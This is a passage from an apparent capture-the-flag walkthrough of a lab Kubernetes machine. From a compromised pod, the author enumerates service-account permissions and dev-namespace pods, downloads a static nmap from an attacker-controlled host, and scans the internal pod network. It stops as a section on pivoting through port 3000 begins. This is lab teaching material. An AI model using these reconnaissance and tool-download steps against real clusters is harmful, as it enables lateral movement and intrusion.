</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">root@webapp-deployment-5d764566f4-h5zhw:/dev/shm# kubectl auth can-i --list
Resources                                       Non-Resource URLs                     Resource Names   Verbs
selfsubjectaccessreviews.authorization.k8s.io   <span style="color:#ff79c6">[]</span>                                    <span style="color:#ff79c6">[]</span>               <span style="color:#ff79c6">[</span>create<span style="color:#ff79c6">]</span>
selfsubjectrulesreviews.authorization.k8s.io    <span style="color:#ff79c6">[]</span>                                    <span style="color:#ff79c6">[]</span>               <span style="color:#ff79c6">[</span>create<span style="color:#ff79c6">]</span>
namespaces                                      <span style="color:#ff79c6">[]</span>                                    <span style="color:#ff79c6">[]</span>               <span style="color:#ff79c6">[</span>get list<span style="color:#ff79c6">]</span>
<span style="color:#ff79c6">[</span>...<span style="color:#ff79c6">]</span>
root@webapp-deployment-5d764566f4-h5zhw:/dev/shm# kubectl get namespaces
NAME              STATUS   AGE
default           Active   237d
dev               Active   236d
kube-node-lease   Active   237d
kube-public       Active   237d
kube-system       Active   237d
</code></pre></td></tr></table>
</div>
</div><p>We can check permissions on the <code>dev</code> namespace. Listing pods is allowed:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">root@webapp-deployment-5d764566f4-h5zhw:/dev/shm# kubectl auth can-i --list -n dev
Resources                                       Non-Resource URLs                     Resource Names   Verbs
selfsubjectaccessreviews.authorization.k8s.io   <span style="color:#ff79c6">[]</span>                                    <span style="color:#ff79c6">[]</span>               <span style="color:#ff79c6">[</span>create<span style="color:#ff79c6">]</span>
selfsubjectrulesreviews.authorization.k8s.io    <span style="color:#ff79c6">[]</span>                                    <span style="color:#ff79c6">[]</span>               <span style="color:#ff79c6">[</span>create<span style="color:#ff79c6">]</span>
namespaces                                      <span style="color:#ff79c6">[]</span>                                    <span style="color:#ff79c6">[]</span>               <span style="color:#ff79c6">[</span>get list<span style="color:#ff79c6">]</span>
pods                                            <span style="color:#ff79c6">[]</span>                                    <span style="color:#ff79c6">[]</span>               <span style="color:#ff79c6">[</span>get list<span style="color:#ff79c6">]</span>
<span style="color:#ff79c6">[</span>..<span style="color:#ff79c6">]</span>
root@webapp-deployment-5d764566f4-h5zhw:/dev/shm# kubectl get pods -n dev
NAME                                READY   STATUS    RESTARTS   AGE
devnode-deployment-cd86fb5c-6ms8d   1/1     Running   <span style="color:#bd93f9">30</span>         236d
devnode-deployment-cd86fb5c-mvrfz   1/1     Running   <span style="color:#bd93f9">31</span>         236d
devnode-deployment-cd86fb5c-qlxww   1/1     Running   <span style="color:#bd93f9">31</span>         236d
</code></pre></td></tr></table>
</div>
</div><p>There is 3 pods that we can explore with the <code>describe</code> command:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">root@webapp-deployment-5d764566f4-h5zhw:/dev/shm# kubectl describe pod devnode-deployment-cd86fb5c-6ms8d -n dev
Name:         devnode-deployment-cd86fb5c-6ms8d
Namespace:    dev
Priority:     <span style="color:#bd93f9">0</span>
Node:         unobtainium/10.10.10.235
Start Time:   Sun, <span style="color:#bd93f9">17</span> Jan <span style="color:#bd93f9">2021</span> 18:16:21 +0000
Labels:       <span style="color:#8be9fd;font-style:italic">app</span><span style="color:#ff79c6">=</span>devnode
              pod-template-hash<span style="color:#ff79c6">=</span>cd86fb5c
Annotations:  &lt;none&gt;
Status:       Running
IP:           172.17.0.6
IPs:
  IP:           172.17.0.6
Controlled By:  ReplicaSet/devnode-deployment-cd86fb5c
Containers:
  devnode:
    Container ID:   docker://d795fc0f2ef2d7a6617a2526702a3e53b77dd496b5f6c9273984a1b773d77fb9
    Image:          localhost:5000/node_server
    Image ID:       docker-pullable://localhost:5000/node_server@sha256:f3bfd2fc13c7377a380e018279c6e9b647082ca590600672ff787e1bb918e37c
    Port:           3000/TCP
    Host Port:      0/TCP
    State:          Running
      Started:      Fri, <span style="color:#bd93f9">10</span> Sep <span style="color:#bd93f9">2021</span> 05:09:51 +0000
    Last State:     Terminated
      Reason:       Error
      Exit Code:    <span style="color:#bd93f9">137</span>
      Started:      Mon, <span style="color:#bd93f9">26</span> Jul <span style="color:#bd93f9">2021</span> 15:00:22 +0000
      Finished:     Mon, <span style="color:#bd93f9">26</span> Jul <span style="color:#bd93f9">2021</span> 15:04:55 +0000
    Ready:          True
    Restart Count:  <span style="color:#bd93f9">30</span>
    Environment:    &lt;none&gt;
    Mounts:
      /var/run/secrets/kubernetes.io/serviceaccount from default-token-rmcd6 <span style="color:#ff79c6">(</span>ro<span style="color:#ff79c6">)</span>
Conditions:
  Type              Status
  Initialized       True
  Ready             True
  ContainersReady   True
  PodScheduled      True
Volumes:
  default-token-rmcd6:
    Type:        Secret <span style="color:#ff79c6">(</span>a volume populated by a Secret<span style="color:#ff79c6">)</span>
    SecretName:  default-token-rmcd6
    Optional:    <span style="color:#8be9fd;font-style:italic">false</span>
QoS Class:       BestEffort
Node-Selectors:  &lt;none&gt;
Tolerations:     node.kubernetes.io/not-ready:NoExecute <span style="color:#8be9fd;font-style:italic">op</span><span style="color:#ff79c6">=</span>Exists <span style="color:#ff79c6">for</span> 300s
                 node.kubernetes.io/unreachable:NoExecute <span style="color:#8be9fd;font-style:italic">op</span><span style="color:#ff79c6">=</span>Exists <span style="color:#ff79c6">for</span> 300s
Events:          &lt;none&gt;
</code></pre></td></tr></table>
</div>
</div><p>We got the IP:Port for this pod: <code>172.17.0.6:3000</code>. Similarly we find the same port for other pods at address:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#ff79c6">for</span> i in mvrfz qlxww ; <span style="color:#ff79c6">do</span> kubectl describe pod devnode-deployment-cd86fb5c-<span style="color:#8be9fd;font-style:italic">$i</span> -n dev | egrep -i <span style="color:#f1fa8c">&#34;IP|Port&#34;</span> ; <span style="color:#ff79c6">done</span>
IP:           172.17.0.5
IPs:
  IP:           172.17.0.5
    Port:           3000/TCP
    Host Port:      0/TCP
IP:           172.17.0.8
IPs:
  IP:           172.17.0.8
    Port:           3000/TCP
    Host Port:      0/TCP
</code></pre></td></tr></table>
</div>
</div><h1 id="nmap-exploration">nmap exploration</h1>
<p>Assuming we were not allowed to describe the pods, we would have been able to upload a <a href="https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap">statically-linked version of nmap</a> to find the same:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">curl -LO https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/nmap
python3 -m http.server <span style="color:#bd93f9">80</span>
Serving HTTP on 0.0.0.0 port <span style="color:#bd93f9">80</span> <span style="color:#ff79c6">(</span>http://0.0.0.0:80/<span style="color:#ff79c6">)</span> ...
172.19.0.1 - - <span style="color:#ff79c6">[</span>11/Sep/2021 15:44:53<span style="color:#ff79c6">]</span> <span style="color:#f1fa8c">&#34;GET /nmap HTTP/1.1&#34;</span> <span style="color:#bd93f9">200</span> -
────────────────────────────────────────────────────────────────────────────────────────────────────────────
root@webapp-deployment-5d764566f4-h5zhw:/dev/shm# curl -O http://10.10.14.15/nmap
root@webapp-deployment-5d764566f4-h5zhw:/dev/shm# ./nmap
</code></pre></td></tr></table>
</div>
</div><p>We can&rsquo;t execute binaries from <code>/dev/shm</code> but we can do it from /tmp</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">root@webapp-deployment-5d764566f4-h5zhw:/dev/shm# <span style="color:#ff79c6">for</span> i in <span style="color:#ff79c6">{</span>3..20<span style="color:#ff79c6">}</span> ; <span style="color:#ff79c6">do</span> ping -c <span style="color:#bd93f9">1</span> 172.17.0.<span style="color:#8be9fd;font-style:italic">$i</span> | grep <span style="color:#f1fa8c">&#34;64 bytes from&#34;</span>  ; <span style="color:#ff79c6">done</span>
<span style="color:#bd93f9">64</span> bytes from 172.17.0.3: <span style="color:#8be9fd;font-style:italic">icmp_seq</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">1</span> <span style="color:#8be9fd;font-style:italic">ttl</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">64</span> <span style="color:#8be9fd;font-style:italic">time</span><span style="color:#ff79c6">=</span>0.036 ms
<span style="color:#bd93f9">64</span> bytes from 172.17.0.4: <span style="color:#8be9fd;font-style:italic">icmp_seq</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">1</span> <span style="color:#8be9fd;font-style:italic">ttl</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">64</span> <span style="color:#8be9fd;font-style:italic">time</span><span style="color:#ff79c6">=</span>0.137 ms
<span style="color:#bd93f9">64</span> bytes from 172.17.0.5: <span style="color:#8be9fd;font-style:italic">icmp_seq</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">1</span> <span style="color:#8be9fd;font-style:italic">ttl</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">64</span> <span style="color:#8be9fd;font-style:italic">time</span><span style="color:#ff79c6">=</span>0.107 ms
<span style="color:#bd93f9">64</span> bytes from 172.17.0.6: <span style="color:#8be9fd;font-style:italic">icmp_seq</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">1</span> <span style="color:#8be9fd;font-style:italic">ttl</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">64</span> <span style="color:#8be9fd;font-style:italic">time</span><span style="color:#ff79c6">=</span>0.059 ms
<span style="color:#bd93f9">64</span> bytes from 172.17.0.7: <span style="color:#8be9fd;font-style:italic">icmp_seq</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">1</span> <span style="color:#8be9fd;font-style:italic">ttl</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">64</span> <span style="color:#8be9fd;font-style:italic">time</span><span style="color:#ff79c6">=</span>0.064 ms
<span style="color:#bd93f9">64</span> bytes from 172.17.0.8: <span style="color:#8be9fd;font-style:italic">icmp_seq</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">1</span> <span style="color:#8be9fd;font-style:italic">ttl</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">64</span> <span style="color:#8be9fd;font-style:italic">time</span><span style="color:#ff79c6">=</span>0.103 ms
<span style="color:#bd93f9">64</span> bytes from 172.17.0.9: <span style="color:#8be9fd;font-style:italic">icmp_seq</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">1</span> <span style="color:#8be9fd;font-style:italic">ttl</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">64</span> <span style="color:#8be9fd;font-style:italic">time</span><span style="color:#ff79c6">=</span>0.054 ms
<span style="color:#bd93f9">64</span> bytes from 172.17.0.10: <span style="color:#8be9fd;font-style:italic">icmp_seq</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">1</span> <span style="color:#8be9fd;font-style:italic">ttl</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">64</span> <span style="color:#8be9fd;font-style:italic">time</span><span style="color:#ff79c6">=</span>0.047 ms

root@webapp-deployment-5d764566f4-h5zhw:/dev/shm# ./nmap -sn 172.17.0.0/24
nmap -sn -T4 172.17.0.0/24

Starting Nmap 6.49BETA1 <span style="color:#ff79c6">(</span> http://nmap.org <span style="color:#ff79c6">)</span> at 2021-09-11 08:02 UTC
Cannot find nmap-payloads. UDP payloads are disabled.
Stats: 0:00:05 elapsed; <span style="color:#bd93f9">0</span> hosts completed <span style="color:#ff79c6">(</span><span style="color:#bd93f9">0</span> up<span style="color:#ff79c6">)</span>, <span style="color:#bd93f9">255</span> undergoing ARP Ping Scan
Parallel DNS resolution of <span style="color:#bd93f9">255</span> hosts. Timing: About 33.33% <span style="color:#ff79c6">done</span>; ETC: 08:02 <span style="color:#ff79c6">(</span>0:00:04 remaining<span style="color:#ff79c6">)</span>
Nmap scan report <span style="color:#ff79c6">for</span> 172.17.0.1
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up <span style="color:#ff79c6">(</span>0.00011s latency<span style="color:#ff79c6">)</span>.
MAC Address: 02:42:E7:21:86:64 <span style="color:#ff79c6">(</span>Unknown<span style="color:#ff79c6">)</span>
Nmap scan report <span style="color:#ff79c6">for</span> 172.17.0.2
Host is up <span style="color:#ff79c6">(</span>0.000014s latency<span style="color:#ff79c6">)</span>.
MAC Address: 02:42:AC:11:00:02 <span style="color:#ff79c6">(</span>Unknown<span style="color:#ff79c6">)</span>
Nmap scan report <span style="color:#ff79c6">for</span> 172-17-0-4.kube-dns.kube-system.svc.cluster.local <span style="color:#ff79c6">(</span>172.17.0.4<span style="color:#ff79c6">)</span>
Host is up <span style="color:#ff79c6">(</span>0.000014s latency<span style="color:#ff79c6">)</span>.
MAC Address: 02:42:AC:11:00:04 <span style="color:#ff79c6">(</span>Unknown<span style="color:#ff79c6">)</span>
Nmap scan report <span style="color:#ff79c6">for</span> 172.17.0.5
Host is up <span style="color:#ff79c6">(</span>0.000013s latency<span style="color:#ff79c6">)</span>.
MAC Address: 02:42:AC:11:00:05 <span style="color:#ff79c6">(</span>Unknown<span style="color:#ff79c6">)</span>
Nmap scan report <span style="color:#ff79c6">for</span> 172.17.0.6
Host is up <span style="color:#ff79c6">(</span>0.000013s latency<span style="color:#ff79c6">)</span>.
MAC Address: 02:42:AC:11:00:06 <span style="color:#ff79c6">(</span>Unknown<span style="color:#ff79c6">)</span>
Nmap scan report <span style="color:#ff79c6">for</span> 172-17-0-7.webapp-service.default.svc.cluster.local <span style="color:#ff79c6">(</span>172.17.0.7<span style="color:#ff79c6">)</span>
Host is up <span style="color:#ff79c6">(</span>0.000012s latency<span style="color:#ff79c6">)</span>.
MAC Address: 02:42:AC:11:00:07 <span style="color:#ff79c6">(</span>Unknown<span style="color:#ff79c6">)</span>
Nmap scan report <span style="color:#ff79c6">for</span> 172.17.0.8
Host is up <span style="color:#ff79c6">(</span>0.000013s latency<span style="color:#ff79c6">)</span>.
MAC Address: 02:42:AC:11:00:08 <span style="color:#ff79c6">(</span>Unknown<span style="color:#ff79c6">)</span>
Nmap scan report <span style="color:#ff79c6">for</span> 172.17.0.9
Host is up <span style="color:#ff79c6">(</span>0.000019s latency<span style="color:#ff79c6">)</span>.
MAC Address: 02:42:AC:11:00:09 <span style="color:#ff79c6">(</span>Unknown<span style="color:#ff79c6">)</span>
Nmap scan report <span style="color:#ff79c6">for</span> 172-17-0-10.webapp-service.default.svc.cluster.local <span style="color:#ff79c6">(</span>172.17.0.10<span style="color:#ff79c6">)</span>
Host is up <span style="color:#ff79c6">(</span>0.000027s latency<span style="color:#ff79c6">)</span>.
MAC Address: 02:42:AC:11:00:0A <span style="color:#ff79c6">(</span>Unknown<span style="color:#ff79c6">)</span>
Nmap scan report <span style="color:#ff79c6">for</span> webapp-deployment-5d764566f4-h5zhw <span style="color:#ff79c6">(</span>172.17.0.3<span style="color:#ff79c6">)</span>
</code></pre></td></tr></table>
</div>
</div><h1 id="port-3000-exploitation---pivoting-on-another-pod">Port 3000 exploitation - pivoting on another pod</h1>
<p>NodeJS Express server runs by default on port 3000. Simple GET allows to retrieve an empty json list <code>[]</code></p>
